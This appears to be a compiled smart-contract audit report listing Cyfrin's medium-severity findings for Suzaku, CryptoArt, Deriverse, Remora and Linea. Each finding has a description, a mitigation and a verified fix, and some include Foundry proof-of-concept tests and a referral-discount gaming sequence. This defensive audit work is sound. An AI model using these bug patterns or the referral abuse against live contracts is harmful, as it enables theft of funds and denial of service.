        address[] memory operators = middleware.getAllOperators();
        uint256 totalOperatorShares = 0;

        for (uint256 i = 0; i < operators.length; i++) {
            uint256 opShare = rewards.operatorShares(epoch, operators[i]);
            totalOperatorShares += opShare;
        }
        console2.log("Total operator shares: ", totalOperatorShares);
        assertGt(totalOperatorShares, rewards.BASIS_POINTS_DENOMINATOR(),
                "VULNERABILITY: Total operator shares exceed 100%");

        //DOS when 6'th operator tries to claim rewards
        vm.warp((epoch + 1) * middleware.EPOCH_DURATION());
        for (uint256 i = 0; i < 5; i++) {
             vm.prank(operators[i]);
            rewards.claimOperatorFee(address(rewardsToken), operators[i]);
        }

        vm.expectRevert();
        vm.prank(operators[5]);
        rewards.claimOperatorFee(address(rewardsToken), operators[5]);

    }
```
**Recommended Mitigation:** Consider adding validation in `setRewardsShareForAssetClass` to enforce that total share across all assets does not exceed 100%.

```solidity
function setRewardsShareForAssetClass(uint96 assetClass, uint16 share) external onlyRole(REWARDS_MANAGER_ROLE) {
    if (share > BASIS_POINTS_DENOMINATOR) revert InvalidShare(share);

    // Calculate total shares including the new one
    uint96[] memory allAssetClasses = l1Middleware.getAssetClassIds();
    uint256 totalShares = share;

    for (uint256 i = 0; i < allAssetClasses.length; i++) {
        if (allAssetClasses[i] != assetClass) {
            totalShares += rewardsSharePerAssetClass[allAssetClasses[i]];
        }
    }

    if (totalShares > BASIS_POINTS_DENOMINATOR) {
        revert TotalAssetClassSharesExceed100Percent(totalShares); //@audit this check ensures proper distribution
    }

    rewardsSharePerAssetClass[assetClass] = share;
    emit RewardsShareUpdated(assetClass, share);
}
```

Consider adding similar validation in functions such as `updateProtocolFee`, `updateOperatorFee`, `updateCuratorFee`.


**Suzaku:**
Fixed in commit [001cf04](https://github.com/suzaku-network/suzaku-core/pull/155/commits/001cf049c654d363fbd87d8f2b7c8c2aa6ba6079).

**Cyfrin:** Verified.

## [M-32] Unclaimable rewards for removed vaults in `Rewards::claimRewards`
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** In the `Rewards::claimRewards` function, stakers claim their rewards across all vaults they were active in during previous epochs. These vaults are determined by the `_getStakerVaults` function, which retrieves vaults via `middlewareVaultManager.getVaults(epoch)`.

```solidity
function _getStakerVaults(address staker, uint48 epoch) internal view returns (address[] memory) {
        address[] memory vaults = middlewareVaultManager.getVaults(epoch);
        uint48 epochStart = l1Middleware.getEpochStartTs(epoch);

        uint256 count = 0;

        // First pass: Count non-zero balance vaults
        for (uint256 i = 0; i < vaults.length; i++) {
            uint256 balance = IVaultTokenized(vaults[i]).activeBalanceOfAt(staker, epochStart, new bytes(0));
            if (balance > 0) {
                count++;
            }
        }
```

The vulnerability arises when a vault is removed **after rewards have been distributed** but **before the user claims them**. Since `getVaults(epoch)` no longer includes removed vaults, `_getStakerVaults` omits them from the list, and the rewards for those vaults are **never claimed**—resulting in **permanently locked rewards**.

1. **Epoch 5**: Rewards are distributed for Vault 1 and Vault 2.
2. Staker 1 has staked in Vault 1 and earned rewards.
3. **Before claiming**, Vault 1 is removed from the system.
4. In **Epoch 6**, Staker 1 calls `claimRewards`.
5. `_getStakerVaults` internally calls `getVaults(epoch)`, which no longer includes Vault 1.
6. Vault 1 is skipped, and rewards for Epoch 5 remain **unclaimed**.
7. These rewards are now **permanently stuck** in the contract.


```solidity

function claimRewards(address rewardsToken, address recipient) external {
        if (recipient == address(0)) revert InvalidRecipient(recipient);

        uint48 lastClaimedEpoch = lastEpochClaimedStaker[msg.sender];
        uint48 currentEpoch = l1Middleware.getCurrentEpoch();

        if (currentEpoch > 0 && lastClaimedEpoch >= currentEpoch - 1) {
            revert AlreadyClaimedForLatestEpoch(msg.sender, lastClaimedEpoch);
        }

        uint256 totalRewards = 0;

        for (uint48 epoch = lastClaimedEpoch + 1; epoch < currentEpoch; epoch++) {
            address[] memory vaults = _getStakerVaults(msg.sender, epoch);
            uint48 epochTs = l1Middleware.getEpochStartTs(epoch);
            uint256 epochRewards = rewardsAmountPerTokenFromEpoch[epoch].get(rewardsToken);
```
**Impact:** Rewards become permanently unclaimable and locked within the contract.

**Proof of Concept:**
```solidity
function test_distributeRewards_andRemoveVault(
        uint256 uptime
    ) public {
        uint48 epoch = 1;
        uptime = bound(uptime, 0, 4 hours);

        address staker = makeAddr("Staker");
        address staker1 = makeAddr("Staker1");

        // Set staker balance in vault
        address vault = vaultManager.vaults(0);
        MockVault(vault).setActiveBalance(staker, 300_000 * 1e18);
        MockVault(vault).setActiveBalance(staker1, 300_000 * 1e18);

        // Set up stakes for operators, nodes, delegators and l1 middleware
        _setupStakes(epoch, uptime);

        vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
        uint256 epochTs = middleware.getEpochStartTs(epoch);
        MockVault(vault).setTotalActiveShares(uint48(epochTs), 400_000 * 1e18);

        // Distribute rewards
        test_distributeRewards(4 hours);

        vm.warp((epoch + 4) * middleware.EPOCH_DURATION());

        uint256 stakerBalanceBefore = rewardsToken.balanceOf(staker);

        vm.prank(staker);
        rewards.claimRewards(address(rewardsToken), staker);

        uint256 stakerBalanceAfter = rewardsToken.balanceOf(staker);

        uint256 stakerRewards = stakerBalanceAfter - stakerBalanceBefore;

        assertGt(stakerRewards, 0, "Staker should receive rewards");

        vaultManager.removeVault(vaultManager.vaults(0));

        uint256 stakerBalanceBefore1 = rewardsToken.balanceOf(staker1);

        vm.prank(staker1);
        rewards.claimRewards(address(rewardsToken), staker1);

        uint256 stakerBalanceAfter1 = rewardsToken.balanceOf(staker1);

        uint256 stakerRewards1 = stakerBalanceAfter1 - stakerBalanceBefore1;

        assertGt(stakerRewards1, 0, "Staker should receive rewards");
    }
```

**Recommended Mitigation:** Consider removing the `MiddlewareVaultManager::removeVault` function to prevent issue or allow removal only after a big chunk of epochs elapse.

**Suzaku:**
Fixed in commit [b94d488](https://github.com/suzaku-network/suzaku-core/pull/155/commits/b94d4880af05185a972178aeceb2877ab260b59b).

**Cyfrin:** Verified.

## [M-33] Vault limit cannot be modified if vault Is already enabled
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description**

The `updateVaultMaxL1Limit` function reverts with `MapWithTimeData__AlreadyEnabled` when attempting to increase or decrease the vault limit if the vault is already enabled. This behavior occurs due to the call to `vaults.enable(vault)` within the function, which fails when the vault is already in an enabled state.

```solidity
function updateVaultMaxL1Limit(address vault, uint96 assetClassId, uint256 vaultMaxL1Limit) external onlyOwner {
    if (!vaults.contains(vault)) {
        revert AvalancheL1Middleware__NotVault(vault);
    }
    if (vaultToAssetClass[vault] != assetClassId) {
        revert AvalancheL1Middleware__WrongVaultAssetClass();
    }

    _setVaultMaxL1Limit(vault, assetClassId, vaultMaxL1Limit);

    if (vaultMaxL1Limit == 0) {
        vaults.disable(vault);
    } else {
        vaults.enable(vault);
    }
}
```

**Impact**

Calling `updateVaultMaxL1Limit` with a non-zero `vaultMaxL1Limit` for an already-enabled vault results in a revert, breaking the expected behavior. The current design requires the vault to be explicitly disabled before setting a new non-zero limit and enabling it again. This workflow is unintuitive and introduces unnecessary friction for the contract owner or administrator.

**Proof of Concept**

The following test will fail due to the described behavior. Add it to the `AvalancheL1MiddlewareTest`:

```solidity
function testUpdateVaultMaxL1Limit() public {
    vm.startPrank(validatorManagerAddress);

    // Attempt to update to a new non-zero limit while vault is already enabled
    vaultManager.updateVaultMaxL1Limit(address(vault), 1, 500 ether);

    vm.stopPrank();
}
```

**Recommended Mitigation**

Consider modifying the logic inside `updateVaultMaxL1Limit` to check the current enabled state before attempting to enable or disable. Only call `vaults.enable(vault)` or `vaults.disable(vault)` if there is an actual state transition.

**Suzaku:**
Fixed in commit [a9f6aaa](https://github.com/suzaku-network/suzaku-core/pull/155/commits/a9f6aaa92bd3800335c4d8085225a23a38c58b34).

**Cyfrin:** Verified.

## [M-34] Wrong revert reason In `onSlash` functionality
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** In the `onSlash` function of `VaultTokenized`, the following check is used to validate the `captureEpoch` parameter:
```solidity
if ((currentEpoch_ > 0 && captureEpoch < currentEpoch_ - 1) || captureEpoch > currentEpoch_) {
    revert Vault__InvalidCaptureEpoch();
}
```
If `currentEpoch_` is 0, the expression `captureEpoch < currentEpoch_ - 1` will underflow, since `currentEpoch_ - 1` becomes less than 0. This will cause the check to revert with a generic arithmetic error instead of the intended custom error.

**Impact:** If `currentEpoch_` is 0, calling `onSlash` will cause an underflow in the comparison, resulting in a revert with a generic arithmetic error rather than the intended `Vault__InvalidCaptureEpoch` error. This can make debugging more difficult and may lead to unexpected behavior for callers.

**Recommended Mitigation:** Update the condition to avoid underflow by checking:
```solidity
if ((currentEpoch_ > 0 && captureEpoch + 1 < currentEpoch_) || captureEpoch > currentEpoch_) {
    revert Vault__InvalidCaptureEpoch();
}
```
This ensures the check is safe for all values of `currentEpoch_` and always reverts with the correct custom error when the input is invalid.

**Suzaku:**
Fixed in commit [b654dfb](https://github.com/suzaku-network/suzaku-core/commit/b654dfbb31dd6e840f2f7dfcda0f55dda3ff37b2).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization

## [M-35] Wrong value is returned in `upperLookupRecentCheckpoint`
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** In `Checkpoint::upperLookupRecentCheckpoint`  function is designed to check if there exists a checkpoint with a key less than or equal to the provided search key in the structure (i.e., the structure is not empty). If such a checkpoint exists, it returns the key, value, and position of the checkpoint in the trace.
However, the function behaves incorrectly when a valid hint is provided, which contradicts its intended purpose.

This comes from the fact that `at` is returning the correct value.

```solidity
function at(Trace256 storage self, uint32 pos) internal view returns (Checkpoint256 memory) {
        OZCheckpoints.Checkpoint208 memory checkpoint = self._trace.at(pos);
        return Checkpoint256({_key: checkpoint._key, _value: self._values[checkpoint._value]});
    }
```

**Impact:** The incorrect handling of the checkpoint value in `upperLookupRecentCheckpoint` can cause the function to revert or return an incorrect value, undermining the reliability of the checkpoint lookup mechanism.

**Proof of Concept:** Run the following test

```solidity
contract CheckpointsBugTest is Test {
    using ExtendedCheckpoints for ExtendedCheckpoints.Trace256;

    ExtendedCheckpoints.Trace256 internal trace;

    function setUp() public {
        // Initialize the trace with some checkpoints
        trace.push(100, 1000); // timestamp 100, value 1000
        trace.push(200, 2000); // timestamp 200, value 2000
        trace.push(300, 3000); // timestamp 300, value 3000
    }

    function test_upperLookupRecentCheckpoint_withoutHint_works() public view {
        // Test without hint - this should work correctly
        (bool exists, uint48 key, uint256 value, uint32 pos) = trace.upperLookupRecentCheckpoint(150);

        assertTrue(exists, "Checkpoint should exist");
        assertEq(key, 100, "Key should be 100");
        assertEq(value, 1000, "Value should be 1000");
        assertEq(pos, 0, "Position should be 0");
    }

    // This test demonstrates the bug when using a valid hint
    function test_upperLookupRecentCheckpoint_withValidHint_demonstratesBug() public {

        // First, let's get the correct hint (position 0)
        uint32 validHint = 0;
        bytes memory hintBytes = abi.encode(validHint);

        // Call with hint - this will fail due to the bug
        vm.expectRevert(); // Expecting a revert due to array bounds error
        trace.upperLookupRecentCheckpoint(150, hintBytes);
    }

}
```

**Recommended Mitigation:** Modify the `upperLookupRecentCheckpoint` function to directly use the `checkpoint._value` returned by the at function, rather than referencing `self._values[checkpoint._value]`. The proposed change is as follows:

```diff
function upperLookupRecentCheckpoint(
        Trace256 storage self,
        uint48 key,
        bytes memory hint_
    ) internal view returns (bool, uint48, uint256, uint32) {
        if (hint_.length == 0) {
            return upperLookupRecentCheckpoint(self, key);
        }
        uint32 hint = abi.decode(hint_, (uint32));
        Checkpoint256 memory checkpoint = at(self, hint);
        if (checkpoint._key == key) {
-           return (true, checkpoint._key, self._values[checkpoint._value], hint);
+           return (true, checkpoint._key, checkpoint._value, hint);
        }
        if (checkpoint._key < key && (hint == length(self) - 1 || at(self, hint + 1)._key > key)) {
-            return (true, checkpoint._key, self._values[checkpoint._value], hint);
+            return (true, checkpoint._key, checkpoint._value, hint);
        }
        return upperLookupRecentCheckpoint(self, key);
```

**Suzaku:**
Fixed in commit [d198969](https://github.com/suzaku-network/suzaku-core/pull/155/commits/d198969910088d087cd52d2a6bad15fe2530df9c).

**Cyfrin:** Verified.

## [M-36] `IERC7160` specification requires `hasPinnedTokenURI` to revert for non-existent `tokenId`
- Severity: `Medium`
- Source report: `cryptoart.md`

### Detailed Content (from source)
**Description:** Per the specification of `IERC7160`:
```solidity
/// @notice Check on-chain if a token id has a pinned uri or not
/// @dev This call MUST revert if the token does not exist
function hasPinnedTokenURI(uint256 tokenId) external view returns (bool pinned);
```

But the implementation of `hasPinnedTokenURI` doesn't revert for tokens which don't exist, instead it will simply return `false` or even return `true` if a token was burned when the value was true since burning doesn't delete `_hasPinnedTokenURI` (another issue has been created to track this):
```solidity
function hasPinnedTokenURI(uint256 tokenId) external view returns (bool) {
    return _hasPinnedTokenURI[tokenId];
}
```

**Recommended Mitigation:** Use the `onlyIfTokenExists` modifier:
```diff
-    function hasPinnedTokenURI(uint256 tokenId) external view returns (bool) {
+    function hasPinnedTokenURI(uint256 tokenId) external view onlyIfTokenExists(tokenId) returns (bool) {
```

**CryptoArt:**
Fixed in commit [56d0e22](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/56d0e222cdf25a971cd6466fd4757185a4362069).

**Cyfrin:** Verified.

## [M-37] `IERC7160` specification requires `pinTokenURI` to revert for non-existent `tokenId`
- Severity: `Medium`
- Source report: `cryptoart.md`

### Detailed Content (from source)
**Description:** Per the specification of `IERC7160`:
```solidity
/// @notice Pin a specific token uri for a particular token
/// @dev This call MUST revert if the token does not exist
function pinTokenURI(uint256 tokenId, uint256 index) external;
```

But the implementation of `pinTokenURI` doesn't revert for tokens which don't exist, since `_tokenURIs[tokenId].length` will always equal 2 even for non-existent `tokenId`:
```solidity
// mapping value always has fixed array size of 2
mapping(uint256 tokenId => string[2] tokenURIs) private _tokenURIs;

function pinTokenURI(uint256 tokenId, uint256 index) external onlyOwner {
    if (index >= _tokenURIs[tokenId].length) {
        revert Error.Token_IndexOutOfBounds(tokenId, index, _tokenURIs[tokenId].length - 1);
    }

    _pinnedURIIndex[tokenId] = index;

    emit TokenUriPinned(tokenId, index);
    emit MetadataUpdate(tokenId);
}
```

**Recommended Mitigation:** Use the `onlyIfTokenExists` modifier:
```diff
-    function pinTokenURI(uint256 tokenId, uint256 index) external onlyOwner {
+    function pinTokenURI(uint256 tokenId, uint256 index) external onlyIfTokenExists(tokenId) onlyOwner {
```

**CryptoArt:**
Fixed in commit [0409ae4](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/0409ae4d81225a351c4d42620502843242f2604f).

**Cyfrin:** Verified.

## [M-38] In `tokenURI` avoid copying entire `_tokenURIs[tokenId]` from `storage` into `memory`
- Severity: `Medium`
- Source report: `cryptoart.md`

### Detailed Content (from source)
**Description:** `tokenURI` only uses the "pinned" URI index so there's no reason to copy both token URIs from `storage` to `memory`. Simply use a `storage` reference like this:
```diff
    function tokenURI(uint256 tokenId)
        public
        view
        override(ERC721Upgradeable)
        onlyIfTokenExists(tokenId)
        returns (string memory)
    {
-       string[2] memory uris = _tokenURIs[tokenId];
+       string[2] storage uris = _tokenURIs[tokenId];
        string memory uri = uris[_getTokenURIIndex(tokenId)];

        if (bytes(uri).length == 0) {
            revert Error.Token_NoURIFound(tokenId);
        }

        return string.concat(_baseURI(), uri);
    }
```

**CryptoArt:**
Fixed in commit [591fed0](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/591fed0798ab0cd61fe965c9a4d0b3e8461e0f12).

**Cyfrin:** Verified.

## [M-39] Use named constants to indicate purpose of magic numbers
- Severity: `Medium`
- Source report: `cryptoart.md`

### Detailed Content (from source)
**Description:** Use named constants to indicate purpose of magic numbers. For example in reference to the value of the `_tokenURIs` mapping:
* instead of using literal `2`, use existing named constant `URIS_PER_TOKEN`:
```solidity
CryptoartNFT.sol
72:    mapping(uint256 tokenId => string[2] tokenURIs) private _tokenURIs;
358:        returns (uint256, string[2] memory, bool)
361:        string[2] memory uris = _tokenURIs[tokenId];
698:        string[2] memory uris = _tokenURIs[tokenId];
```

* when setting uris in `updateMetadata` and `_setTokenURIs`, use named constants for the indexes:
```solidity
function updateMetadata(uint256 tokenId, string calldata newRedeemableURI, string calldata newNotRedeemableURI)
    external
    onlyOwner
    onlyIfTokenExists(tokenId)
{
    _tokenURIs[tokenId][URI_REDEEMABLE_INDEX] = newRedeemableURI;
    _tokenURIs[tokenId][URI_NOT_REDEEMABLE_INDEX] = newNotRedeemableURI;
    emit MetadataUpdate(tokenId); // ERC4906
}
```

This can also save gas for example in `pinTokenURI`, instead of using `_tokenURIs[tokenId].length` just use the constant `URIS_PER_TOKEN` since it never changes:
```solidity
function pinTokenURI(uint256 tokenId, uint256 index) external onlyOwner {
    if (index >= URIS_PER_TOKEN) {
        revert Error.Token_IndexOutOfBounds(tokenId, index, URIS_PER_TOKEN - 1);
    }
```

**CryptoArt:**
Fixed in commit [97ef0ad](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/97ef0add6848540e158927092d0a1af820e840fe).

**Cyfrin:** Verified.

## [M-40] `perp_statistics_reset` can be used by users to skip `collactable-losses` while selling market seat
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** Inside `perp-statistics-reset` we set [soc loss funds](https://github.com/deriverse/protocol-v1/blob/30b06d2da69e956c000120cdc15907b5f33088d7/src/program/processor/perp_statistics_reset.rs#L91) to zero without checking if user incurred losses.
```rust
//inside perp-statistics-reset
    client_state.perp_info4()?.soc_loss_funds = 0;
```
if user would have incurred losses, these funds would be positive which means, this is the amount of funds protocol should collect and add to insurance funds at the time when user sells the market seat. we set those to 0 and later call `check-soc-loss` which in turn would make this funds -ve. If now user calls `sell-market-seat` he gets back this funds and [insurance funds](https://github.com/deriverse/protocol-v1/blob/30b06d2da69e956c000120cdc15907b5f33088d7/src/program/processor/sell_market_seat.rs#L123) are also reduced by this amount which is incorrect.
```rust
//inside sell-market-seat
    let collactable_losses = info.funds().min(client_state.perp_info4()?.soc_loss_funds);
    engine.state.header.perp_insurance_fund += collactable_losses;

    client_state.add_crncy_tokens((info.funds() - collactable_losses).max(0))?;

```
if user has incurred losses earlier & his `soc-loss-funds` is positive, he should not be allowed to use `perp-statistics-reset`, he can simply use it to wipe "the amount he owns to protocol on exiting the position".

**Impact:** Users can missuse this to clean their soc loss records which store how much they owe to protocol.

**Recommended Mitigation:** Get user's soc losses, if they are positive, which means user owes the amount to protocol, avoid statistics resetting and revert.

**Deriverse:** Fixed in commit: [e5af702](https://github.com/deriverse/protocol-v1/commit/e5af70204e812ed9f388a0dea23ff89fd15f2394)

**Cyfrin:** Verified.

## [M-41] Accounts may be created with incorrect rent-exemption due to `Rent::default` usage
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** This dos vulnerability arises from the use of hardcoded `rent` parameters during account creation, leading to underfunded accounts that fail rent exemption requirements.

The flawed implementation relies on `Rent::default` instead of the on-chain `Rent sysvar` for rent calculations, creating accounts with insufficient funds for rent exemption.

```rust
    let rent = &Rent::default();
    ...
    let spl_lamports: u64 = rent.minimum_balance(165);

```

The implementation never reads the on-chain Rent `sysvar` (e.g., `Rent::get` or passing the rent `sysvar` account), so the computed minimum balances may not reflect the cluster’s actual rent parameters.


**Impact:** As a result, accounts can be created non–rent-exempt, causing DOS.

**Recommended Mitigation:** It is recommended to use `Rent::get` instead of `Rent::default`.

**Deriverse:** Fixed in commit [d319206](https://github.com/deriverse/protocol-v1/commit/d319206f269efdd6ba1de8ae5966e02f9ffcfec7).

**Cyfrin:** Verified.

## [M-42] Casting from `u64` to `i64` causes genuine deposit requests to fail in `deposit` function
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `deposit` function in `deposit.rs` casts the amount value( the amount of tokens trader is willing to deposit) which is of type `u64` to `i64` when `deposit_all` is set to `true`. When token amounts exceed `i64::MAX` (9,223,372,036,854,775,807), the cast wraps around to negative values due to Rust's default overflow behavior in release builds. The amount is later cast back to u64 for SPL token transfers, however we have this check before casting it back up to `u64`
```rust
    if !(1..=SPOT_MAX_AMOUNT).contains(&amount) {
        bail!(InvalidQuantity {
            value: amount,
            min_value: 1,
            max_value: SPOT_MAX_AMOUNT,
        });
    }
```
here the goal is to put lower and upper bound on the amount between 1 & 36028797018963967, since we have casted the amount from `u64` to `i64`, if the amount was big, It might have turned to a negative number and this negative number does not lie in the desired range, so the transaction does not go through.

**Impact:** Genuine transactions especially for large token decimal mints may get reverted.

**Proof of Concept:**
```rust
fn main() {
    let a: i64;

    let b: u64 = 15_000_000_000_000_000_000;

    a = b as i64;  // Casting

    println!("a = {}", a);  //
}
Output: a = -3446744073709551616
```

**Recommended Mitigation:** Don't convert input amount to `i64` instead we can do this
```rust
const SPOT_MAX_AMOUNT_U64: u64 = SPOT_MAX_AMOUNT as u64;
```
**Deriverse:** Fixed in commit [801209](https://github.com/deriverse/protocol-v1/commit/801209dc5d425dd0a3177d4a41660e0e4ed91bda)

**Cyfrin:** Verified.

## [M-43] Redundant State Updates in `fill` Function Cause Issues
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `fill` function contains **redundant state updates** to `last_asset_tokens` and `last_crncy_tokens` that are already properly handled by `write_last_tokens`. This redundancy causes data loss, incorrect accumulation, and state inconsistency when multiple orders are filled within the same slot.

- The Redundant Update
In the `fill` function, `last_asset_tokens` and `last_crncy_tokens` are redundantly updated:
```rust
self.state.header.last_asset_tokens = traded_qty;
self.state.header.last_crncy_tokens = traded_crncy;
```
After `match_orders` completes, `write_last_tokens` is already called with the accumulated values:

```rust
engine.write_last_tokens(traded_qty, traded_sum, trades, px)?;
```

The `write_last_tokens` function properly handles these state updates with:
- Slot boundary checking
- Accumulation logic when slots match
- Reset logic when slots differ

```rust
if self.state.header.slot == self.slot {
    self.state.header.last_crncy_tokens = self
        .state
        .header
        .last_crncy_tokens
        .checked_add(traded_crncy_tokens)
        .ok_or(drv_err!(DeriverseErrorKind::ArithmeticOverflow))?;
    self.state.header.last_asset_tokens = self
        .state
        .header
        .last_asset_tokens
        .checked_add(traded_asset_tokens)
        .ok_or(drv_err!(DeriverseErrorKind::ArithmeticOverflow))?;
} else {
    self.state.header.slot = self.slot;
    self.state.header.last_crncy_tokens = traded_crncy_tokens;
    self.state.header.last_asset_tokens = traded_asset_tokens;
}
```

Problems Caused by the Redundancy
- Data Loss in fill Loop: Within the `fill` function's loop, each iteration overwrites the previous values, only preserving the last order's values:
```
   while !order.is_null() && *remaining_qty > 0 {
       // ... process order ...
       self.state.header.last_asset_tokens = traded_qty;  // Overwrites previous value!
       self.state.header.last_crncy_tokens = traded_crncy; // Overwrites previous value!
   }
```
- Multiple fill Calls: The `match_orders` function can call `fill` multiple times, each overwriting the state with only partial data.

- Incorrect Accumulation: When `write_last_tokens` is subsequently called. If the slot matches, it adds the total accumulated values to the incorrectly set values from `fill`. This causes double counting or incorrect totals

Example: Before, the `last_asset_tokens = 200`, If `fill` sets `last_asset_tokens = 100` (last order only), then `write_last_tokens` adds the total `traded_qty = 500`, resulting in `600` instead of `200 + 500`.

**Impact:** Incorrect State: When `write_last_tokens` accumulates values, it adds to incorrectly set values, leading to wrong totals

**Recommended Mitigation:** Remove the redundant state updates from the `fill` function.

**Deriverse:** Fixed in commit [0be264f1](https://github.com/deriverse/protocol-v1/commit/0be264f1a0a727aa525ddab8d29c2a74c83294d7).

**Cyfrin:** Verified.

## [M-44] Transfers are noop when `lamports_diff`  is zero
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The codebase contains multiple instances where lamports transfers are performed for rellocating space and size without checking if the transfer amount `lamports_diff` is greater than zero. To evaluate `lamports_diff` we are using `saturating_sub` which limits subtraction in cases when there are chances of underflow.
```rust
// here if the account already had enough lamports to cover up its rent, the `lamports_diff` would come out as 0.
let lamports_diff = new_minimum_balance.saturating_sub(account.lamports());
invoke(
    &system_instruction::transfer(signer.key, account.key, lamports_diff),
    &[signer.clone(), account.clone(), system_program.clone()],
)?;
```
When `lamports_diff` is zero, the code still makes unnecessary Cpi calls to the System Program's transfer instruction, which wastes computational units and is no op.

Here are the files where its present: `perp_engine.rs`, `new_base_crncy.rs`, `new_operator.rs`, `engine.rs`, `candles.rs`, `client_community.rs`, `client_primary.rs`

**Impact:** Unnecessary cu lost in cases when `lamports_diff`==0.

**Recommended Mitigation:** Perform transfer only if `lamports_diff` > 0.
```rust
let lamports_diff = new_minimum_balance.saturating_sub(account.lamports());
if lamports_diff > 0 {
    invoke(
        &system_instruction::transfer(signer.key, account.key, lamports_diff),
        &[signer.clone(), account.clone(), system_program.clone()],
    )?;
}
```
**Deriverse:** Fixed in commit: [7091f4](https://github.com/deriverse/protocol-v1/commit/7091f48316d77e6769ee8fddeadd4d3a250ba1e1)

**Cyfrin:** Verified.

## [M-45] Users can reset the status of their `firstPurchase` on the `referralData` when the `stablecoin` doesn't revert on transfers to `address(0)`
- Severity: `Medium`
- Source report: `final.md`

### Detailed Content (from source)
**Description:** Users can create a referral to get a discount by calling [`ReferralManager::createReferral`](https://github.com/remora-projects/remora-dynamic-tokens/blob/final-audit-prep/contracts/CoreContracts/ReferralManager/ReferralManager.sol#L129-L145). The user receives a discount, and the referrer gets a bonus when the user makes their first purchase.

The system intends to give users a discount only once, but there is an edge case when the stablecoin allows transfer to address(0). This allows calling `ReferralManager::createReferral` and setting the `referrer` as `address(0)`. This effectively bypasses the check to validate if the user has already set a referrer and proceeds to set their `referralData.isFirstPurchase` as true, granting the discount to the user on the next purchase. This allows users to:
1. Call `ReferralManager::createReferral` setting `referrer` as address(0)
2. Purchase a token
3. Call `ReferralManager::createReferral` again setting `referrer` as address(0)

**Impact:** Users can game the referral system to receive a discount on all their purchases by resetting the `firstPurchase` status to true.

**Recommended Mitigation:** When creating the referral, validate that the `referrer` address is not the address(0).
Alternatively, acknowledge this issue and make sure the signers never generate a signature for the `referrer` set as address(0).

**Remora:** Fixed in commit [20eddec](https://github.com/remora-projects/remora-dynamic-tokens/commit/20eddec6e760c7c9bd3669c250e50e562312dfff)

**Cyfrin:** Verified.

\clearpage
## Gas Optimization

## [M-46] `YieldManager::fundYieldProvider` and `LidoStVaultYieldProvider::fundYieldProvider` don't enforce `isStakingPaused` and `isOssificationInitiated` allowing unsafe staking
- Severity: `Medium`
- Source report: `manager.md`

### Detailed Content (from source)
**Description:** `YieldManager::fundYieldProvider` and `LidoStVaultYieldProvider::fundYieldProvider` don't check the `isStakingPaused` and `isOssificationInitiated` flags, allowing staking of new funds when this should be blocked. The protocol [specification](https://hackmd.io/@kyzooroast/HkAKIXS6ex#Pausing-Beacon-Chain-Deposits) states: *"When ossification has been initiated or completed, liabilities are incurred, or withdrawal deficits exist, new validator deposits must be paused to protect user funds."*

Yield Providers can be paused by either:
* explicit call to `YieldManager::pauseStaking`
* when LST liabilities are incurred via `YieldManager::withdrawLST` or ossification is initiated via `YieldManager::initiateOssification`, both functions call `_pauseStakingIfNotAlready` to set `isStakingPaused = true` for the given `_yieldProvider`

`LidoStVaultYieldProvider::fundYieldProvider` reverts if the `isOssified` flag has been set to `true`, but neither it nor `YieldManager::fundYieldProvider` ever revert if the `isStakingPaused` flag for that yield provider has been set to `true`.

**Impact:** Unsafe staking operations; new funds can be staked even if staking has explicitly been paused for a given yield provider.

**Recommended Mitigation:** Add `isStakingPaused` and `isOssificationInitiated` checks to `LidoStVaultYieldProvider::fundYieldProvider` which already has the ossification check.

**Linea:** Fixed in commit [becfd756](https://github.com/Consensys/linea-monorepo/commit/becfd75633a2d46de9fa1d9b02554aef9be1cbde).

**Cyfrin:** Verified. `LidoStVaultYieldProvider::fundYieldProvider` now reverts if staking has been paused or if ossification has been initiated or completed.

## [M-47] `YieldManager::unpauseStaking` uses stale `lstLiabilityPrincipal` causing DoS when external actor repays LST liability
- Severity: `Medium`
- Source report: `manager.md`

### Detailed Content (from source)
**Description:** `YieldManager::unpauseStaking` contains this check:
```solidity
if ($$.lstLiabilityPrincipal > 0) {
  revert UnpauseStakingForbiddenWithCurrentLSTLiability();
}
```

However it doesn't first sync `$$.lstLiabilityPrincipal` using `LidoStVaultYieldProvider::_syncExternalLiabilitySettlement` like other places in the code, meaning it uses a stale value.

**Impact:** LST liabilities can be settled by external parties; when an external party settles a vault's LST liabilities, `YieldManager::unpauseStaking` will incorrectly revert resulting in a denial of service since it erroneously believes that an LST liability still exists.

**Recommended Mitigation:** `YieldManager::unpauseStaking` should sync `$$.lstLiabilityPrincipal` via `LidoStVaultYieldProvider::_syncExternalLiabilitySettlement` prior to using it.

**Linea:** Fixed in commit [0c17a98](https://github.com/Consensys/linea-monorepo/commit/0c17a98aaca91a81d6fe081c23c125ad7bea5c01#diff-5859d4fa4970e34f899c9068e747565347ba390a46e54ead17419d5c81df83b4R882-R886).

**Cyfrin:** Verified.

## [M-48] `YieldManager::withdrawLST` uses stale `lstLiabilityPrincipal` can cause temporary DoS when negative rebasing occurs
- Severity: `Medium`
- Source report: `manager.md`

### Detailed Content (from source)
**Description:** Lido's `stETH` is a rebasing token which can experience both positive and negative rebasing (eg due to slashing).

`LidoStVaultYieldProvider::withdrawLST`:
* takes `_amount` as input which is token amount
* calls `Dashboard::mintStETH` from LidoV3 using token `_amount`
* this in turn calls `STETH::getSharesByPooledEth` to get the shares and the shares are what is minted
* then `$$.lstLiabilityPrincipal += _amount;` records to storage the input token `_amount` as a liability, but this amount can change (both increase & decrease) due to subsequent `stETH` rebasing

Before using `$$.lstLiabilityPrincipal` other functions from `LineaStVaultYieldProvider` synchronize it by calling `_syncExternalLiabilitySettlement`.

However synchronization doesn't occur in the "entry" function `YieldManager::withdrawLST`:
